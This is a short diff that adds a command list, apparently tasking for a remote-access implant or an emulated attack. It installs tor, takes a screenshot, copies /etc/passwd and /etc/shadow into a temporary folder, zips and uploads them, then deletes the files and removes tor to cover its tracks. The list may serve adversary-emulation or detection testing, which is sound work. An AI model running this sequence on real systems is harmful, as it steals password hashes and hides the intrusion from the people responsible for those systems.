@@ -1,0 +1,11 @@
+apt -y install tor
+download http://ipv4.download.thinkbroadband.com/5MB.zip
+screenshot
+mkdir -p /tmp/zzz
+cp /etc/passwd /tmp/zzz/
+cp /etc/shadow /tmp/zzz/
+zip zzz.zip /tmp/zzz/
+upload zzz.zip
+rm -rf /tmp/zzz zzz.zip 5MB.zip
+apt -y remove tor
+
